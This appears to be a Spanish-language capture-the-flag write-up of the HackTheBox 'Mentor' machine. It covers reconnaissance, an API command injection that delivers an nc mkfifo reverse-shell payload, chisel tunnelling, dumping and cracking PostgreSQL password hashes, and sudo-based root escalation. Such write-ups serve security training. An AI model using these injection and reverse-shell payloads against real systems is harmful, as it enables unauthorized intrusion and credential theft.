---
title: Mentor - HackTheBox
categories: [ Linux ]
tags: [ HackTheBox ]
---

<img src="/assets/img/HTB/Mentor/Mentor.jpg">

Hola!! Hoy vamos a completar la máquina [Mentor](https://app.hackthebox.com/machines/Mentor) de la plataforma [HackTheBox](https://app.hackthebox.com)! Donde tocaremos los siguientes puntos:

- **Information Leakage**
- **Command Injection**
- **Chisel Port Forwarding**
- **Docker Breakout Via Hash capture in PostgreSQL database**
- **Abusing Sudoers Privilege [Privilege Escalation]**

# Reconocimiento

## Escaneo nmap 

* * *

Iniciaremos con un escaneo de `nmap` vía protocolo TCP

```shell
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.193 -oG allPorts
Nmap scan report for 10.10.11.193
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Usaremos la herramienta `extractPorts` de S4vitar para extraer información de la captura en formato grepeable de `nmap`

```shell
❯ which extractPorts | batcat -l bash
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ STDIN
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ extractPorts () {
   2   │     ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')" 
   3   │     ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)" 
   4   │     echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
   5   │     echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
   6   │     echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
   7   │     echo $ports | tr -d '\n' | xclip -sel clip
   8   │     echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
   9   │     /bin/batcat --paging=never extractPorts.tmp
  10   │     rm extractPorts.tmp
  11   │ }
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ extractPorts allPorts
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.11.193
   5   │     [*] Open ports: 22,80
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Escanearemos puertos vía UDP, nos damos cuenta del puerto 161 `snmp` abierto

```shell
❯ sudo nmap -T5 --top-ports 100 -sU 10.10.11.193
Nmap scan report for 10.10.11.193
PORT    STATE SERVICE
161/udp open  snmp
```

Con la herramienta `snmpbulkwalk` encontramos credenciales pero no nos sirven para nada ahora mismo

```bash
❯ snmpbulkwalk -v2c -c internal 10.10.11.193 | grep login
iso.3.6.1.2.1.25.4.2.1.2.913 = STRING: "systemd-logind"
iso.3.6.1.2.1.25.4.2.1.2.1690 = STRING: "login.sh"
iso.3.6.1.2.1.25.4.2.1.2.2111 = STRING: "login.py"
iso.3.6.1.2.1.25.4.2.1.4.913 = STRING: "/lib/systemd/systemd-logind"
iso.3.6.1.2.1.25.4.2.1.5.1690 = STRING: "/usr/local/bin/login.sh"
iso.3.6.1.2.1.25.4.2.1.5.2111 = STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"
```

## Reconocimiento Web

* * *

Si nos fijams en la página web nos redirige a `mentorquotes.htb`, así que añadiremos el domino al /etc/hosts

```shell
❯ echo "10.10.11.193 mentorquotes.htb | tee -a /etc/hosts
10.10.11.193 mentorquotes.htb
```

Ahora que tenemos un dominio, podemos fuzzear subdominios, en mi caso voy a usar la herramienta `gobuster`, aunque podéis usar otras como `wfuzz`, etc.

```shell
❯ gobuster vhost -u mentorquotes.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 100 -r
===============================================================
[+] Url:             http://mentorquotes.htb
[+] Method:          GET
[+] Threads:         200
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.5
[+] Timeout:         10s
[+] Append Domain:   false
===============================================================
Found: api.mentorquotes.htb (Status: 404) [Size: 22]
```

Ahora con la herramienta `gobuster` vamos a fuzzear directorios en el subdominio, podemos ver el directorio /docs, nos damos cuenta que está usando Swagger

![](/assets/img/HTB/Mentor/api.png)

Viendo en la web, nos damos cuenta del correo del usuario `james`, cuyo correo es `james@mentorquotes.htb`

![](/assets/img/HTB/Mentor/email.png)

Vamos a intentar registrarnos en la API con la información de la documentación, voy a estar haciendo todo desde la herramienta proxy `BurpSuite`

![](/assets/img/HTB/Mentor/signup.png)

Nos crearemos una cuenta con credenciales aleatorias

![](/assets/img/HTB/Mentor/signup1.png)

Ahora intentaremos capturar el login con `BurpSuite`

![](/assets/img/HTB/Mentor/login.png)

Y se nos proporciona el token `JWT`

![](/assets/img/HTB/Mentor/jwt.png)

Si intentamos más cosas no nos dejará avanzar, así que crearemso una cuenta con el nombre `james`

![](/assets/img/HTB/Mentor/james.png)

Ahora con las credenciales que le hemos proporcionamos nos intentaremos loguear 

![](/assets/img/HTB/Mentor/jameslogin.png)

Ahora, si intentamos listar todos los usuarios en el directorio `/users`

![](/assets/img/HTB/Mentor/users.png)

También, podemos intentar entrar al directorio `/admin` editando los headers para acceder a él, obtenemos dos directorios

![](/assets/img/HTB/Mentor/admin.png)

El directorio `/check` aún no está implementado 

![](/assets/img/HTB/Mentor/check.png)

En el directorio `/backup` nos dice que el metodo `GET` no está autorizado, así que cambiaremos nuestro metodo de petición

![](/assets/img/HTB/Mentor/noget.png)

Nos dice que quiere un objeto `JSON` con el parámetro `body`

![](/assets/img/HTB/Mentor/json.png)

Así que le pasaremos un `JSON` vacío, recordad que tenemos que cambiar el header `application/x-www-form-urlencoded` a `application/json`, la web ahora nos pide otro atributo, `path`

![](/assets/img/HTB/Mentor/json1.png)

Le daremos los dos parámetros, la página nos devuelve un mensaje `Done!`

![](/assets/img/HTB/Mentor/done.png)

En este punto intentaremos una inyección de comandos en el campo `path`, así que nos pondremos en escucha con `tcpdump` en escucha de trazas ICMP

```shell
❯ tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

Ahora editaremos el objeto JSON, por lo que quedaría de la siguiente manera

```json
{
    "body":"l4nder",
    "path":"/etc/passwd;ping -c 1 10.10.14.48;"
}
```

Mandaremos la petición, y obtenemos las trazas ICMP

```shell
❯ tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
19:52:28.337549 IP 10.10.11.193 > 10.10.14.48: ICMP echo request, id 2, seq 1, length 64
19:52:28.337605 IP 10.10.14.48 > 10.10.11.193: ICMP echo reply, id 2, seq 1, length 64
```

Así que cambiaremos la petición para obtener la reverse shell 

```json
{
    "body":"l4nder",
    "path":"/etc/passwd;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.48 443 >/tmp/f;
}
```

Mandamos la petición, y obtenemos la reverse shell, pero nos damos cuenta de que estamos en un contenedor

```shell
❯ nc -nvlp 9001
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.11.193.
Ncat: Connection from 10.10.11.193:41189.
sh: can't access tty; job control turned off
/app # ls
Dockerfile
app
requirements.txt
/app # pwd
/app
/app # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

Dentro del directorio `/app/app`, encontramos el archivo `db.py`, cuyo archivo tiene credenciales para una base de datos `PostgreSQL

```shell
/app # pwd
/app
/app # ls -al
total 32
drwxr-xr-x    1 root     root          4096 Nov 10 16:00 .
drwxr-xr-x    1 root     root          4096 Nov 10 16:00 ..
-rw-r--r--    1 root     root          1024 Jun 12 10:21 .Dockerfile.swp
-rw-r--r--    1 root     root           522 Nov  3 12:58 Dockerfile
drwxr-xr-x    1 root     root          4096 Nov 10 16:00 app
-rw-r--r--    1 root     root           672 Jun  4  2022 requirements.txt
/app # cd app
/app/app # ls -al
total 40
drwxr-xr-x    1 root     root          4096 Nov 10 16:00 .
drwxr-xr-x    1 root     root          4096 Nov 10 16:00 ..
-rw-r--r--    1 root     root             0 Jun  4  2022 __init__.py
drwxr-xr-x    1 root     root          4096 Nov 10 16:00 __pycache__
drwxr-xr-x    1 root     root          4096 Nov 10 16:00 api
-rw-r--r--    1 root     root             0 Jun  4  2022 config.py
-rw-r--r--    1 root     root          1001 Jun  7  2022 db.py
-rw-r--r--    1 root     root          1149 Jun  4  2022 main.py
-rw-r--r--    1 root     root           704 Jun  4  2022 requirements.txt
```

```py
import os

from sqlalchemy import (Column, DateTime, Integer, String, Table, create_engine, MetaData)
from sqlalchemy.sql import func
from databases import Database

# Database url if none is passed the default one is used
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")

# SQLAlchemy for quotes
engine = create_engine(DATABASE_URL)
metadata = MetaData()
quotes = Table(
    "quotes",
    metadata,
    Column("id", Integer, primary_key=True),
    Column("title", String(50)),
    Column("description", String(50)),
    Column("created_date", DateTime, default=func.now(), nullable=False)
)

# SQLAlchemy for users
engine = create_engine(DATABASE_URL)
metadata = MetaData()
users = Table(
    "users",
    metadata,
    Column("id", Integer, primary_key=True),
    Column("email", String(50)),
    Column("username", String(50)),
    Column("password", String(128) ,nullable=False)
)


# Databases query builder
database = Database(DATABASE_URL)
```

Para interactuar con la base de datos, nos haremos un Port Forwarding con chisel

```shell
# Contenedor
./chisel client 10.10.14.48:1234 R:5432:172.22.0.1:5432

# Máquina atacante
./chisel server --port 1234 --reverse
```

Así que ahora nos conectaremos a la base de datos, nos damos cuenta de que hay unso cuentos hashes

```shell
❯ psql -h 10.10.XX.XX -U "postgres" -p 5432
Password for user postgres: 
psql (14.5 (Debian 14.5-2), server 13.7 (Debian 13.7-1.pgdg110+1))
Type "help" for help.

postgres=# \list
                                    List of databases
      Name       |  Owner   | Encoding |  Collate   |   Ctype    |   Access privileges   
-----------------+----------+----------+------------+------------+-----------------------
 mentorquotes_db | postgres | UTF8     | en_US.utf8 | en_US.utf8 | 
 postgres        | postgres | UTF8     | en_US.utf8 | en_US.utf8 | 
 template0       | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +
                 |          |          |            |            | postgres=CTc/postgres
 template1       | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +
                 |          |          |            |            | postgres=CTc/postgres
(4 rows)

postgres=# \c mentorquotes_db
psql (14.5 (Debian 14.5-2), server 13.7 (Debian 13.7-1.pgdg110+1))
You are now connected to database "mentorquotes_db" as user "postgres".
mentorquotes_db=# \d
              List of relations
 Schema |     Name      |   Type   |  Owner   
--------+---------------+----------+----------
 public | cmd_exec      | table    | postgres
 public | quotes        | table    | postgres
 public | quotes_id_seq | sequence | postgres
 public | users         | table    | postgres
 public | users_id_seq  | sequence | postgres
(5 rows)

mentorquotes_db=# select * from users;
 id |          email          |  username   |             password             
----+-------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb  | james       | 7ccdcd8c05b59add9c198d492b36a503
  2 | svc@mentorquotes.htb    | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
  4 | dedsec@mentorquotes.htb | james       | fc8767a5e9e2382a17072b10725e1c8b
(3 rows)
```

Intentaremos crackear el hash con [Crackstation](https://crackstation.net/), nos da la contraseña del usuario `svc`, así que nos intentaremos conectar por `SSH`

![](/assets/img/HTB/Mentor/crackstation.png)

```shell
❯ ssh svc@10.10.11.193
The authenticity of host '10.10.11.193 (10.10.11.193)' can't be established.
ED25519 key fingerprint is SHA256:fkqwgXFJ5spB0IsQCmw4K5HTzEPyM27mczyMp6Qct5Q.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.193' (ED25519) to the list of known hosts.
svc@10.10.11.193's password: 
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-56-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Dec 11 09:41:28 AM UTC 2022

  System load:                      0.0
  Usage of /:                       64.9% of 8.09GB
  Memory usage:                     14%
  Swap usage:                       0%
  Processes:                        240
  Users logged in:                  0
  IPv4 address for br-028c7a43f929: 172.20.0.1
  IPv4 address for br-24ddaa1f3b47: 172.19.0.1
  IPv4 address for br-3d63c18e314d: 172.21.0.1
  IPv4 address for br-7d5c72654da7: 172.22.0.1
  IPv4 address for br-a8a89c3bf6ff: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.193
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:5da8

  => There are 3 zombie processes.


0 updates can be applied immediately.


Last login: Mon Dec  5 14:30:48 2022 from 10.10.14.40
svc@mentor:~$ cat user.txt 
37f652f9868406f5abe95d415a2c0baa
```

# Escalada de privilegios

Al ejecutar `linPEAS` podemos encontrar el apartado de archivos de configuración snmp

```bash
╔══════════╣ Analyzing SNMP Files (limit 70)
-rw-r--r-- 1 root root 3453 Jun  5  2022 /etc/snmp/snmpd.conf
# rocommunity: a SNMPv1/SNMPv2c read-only access community name
rocommunity  public default -V systemonly
rocommunity6 public default -V systemonly
-rw------- 1 Debian-snmp Debian-snmp 1268 Dec 19 04:10 /var/lib/snmp/snmpd.conf
```

En el archivo de configuración podemos encontrar una contraseña en texto plano

```shell
svc@mentor:~$ cat /etc/snmp/snmpd.conf | grep Password
createUser bootstrap MD5 SuperSecurePassword123__ DES
svc@mentor:~$ 
```

Es la contraseña del usuario `James`, así que nos convertiremoos en `James` usando el comando `su`

```shell
svc@mentor:~$ su james
Password: SuperSecurePassword123__
james@mentor:/home/svc$ id
uid=1000(james) gid=1000(james) groups=1000(james)
james@mentor:/home/svc$ 
```

Si nos fijamos en los privilegios a nivel de sudoers, nos percatamos que podemos ejecutar `/bin/sh` como root, la escalada es fácil

```shell
james@mentor:/home/svc$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on mentor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on mentor:
    (ALL) /bin/sh
james@mentor:/home/svc$ sudo sh
# bash
root@mentor:/home/svc# id
uid=0(root) gid=0(root) groups=0(root)
root@mentor:/home/svc# cd
root@mentor:~# ls
logins.log  root.txt  scripts  snap
root@mentor:~# cat root.txt 
85b7faf34ac77201de181b4904ae8111
root@mentor:~# 
```
